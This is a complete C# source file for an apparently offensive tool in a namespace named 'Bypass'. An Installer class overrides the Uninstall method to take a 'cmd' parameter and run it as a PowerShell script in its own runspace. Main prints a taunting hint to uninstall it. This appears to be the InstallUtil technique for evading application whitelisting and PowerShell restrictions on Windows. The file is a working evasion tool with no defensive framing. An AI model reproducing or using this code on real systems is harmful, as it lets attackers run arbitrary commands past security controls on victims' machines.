using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("You better uninstall me :)");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // Retrieve the cmd parameter from the install context
            String cmd = Context.Parameters["cmd"];

            // Ensure the cmd parameter is not null or empty before executing
            if (!string.IsNullOrEmpty(cmd))
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                ps.AddScript(cmd);
                ps.Invoke();
                rs.Close();
            }
            else
            {
                // Display an error message if the cmd parameter is missing
                Console.Error.WriteLine("Error: No command provided. Use /cmd:\"your command here\"");
            }
        }
    }
}
